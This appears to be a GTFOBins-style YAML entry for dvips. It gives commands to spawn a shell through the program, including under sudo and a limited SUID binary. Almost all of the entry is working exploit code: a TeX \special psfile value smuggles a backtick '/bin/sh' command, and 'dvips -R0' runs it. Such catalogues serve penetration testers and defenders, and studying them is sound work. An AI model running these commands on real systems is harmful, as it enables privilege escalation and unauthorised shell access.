---
description: The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.
functions:
  shell:
    - code: |
        tex '\special{psfile="`/bin/sh 1>&0"}\end'
        dvips -R0 texput.dvi
  sudo:
    - code: |
        tex '\special{psfile="`/bin/sh 1>&0"}\end'
        sudo dvips -R0 texput.dvi
  limited-suid:
    - code: |
        tex '\special{psfile="`/bin/sh 1>&0"}\end'
        ./dvips -R0 texput.dvi
---
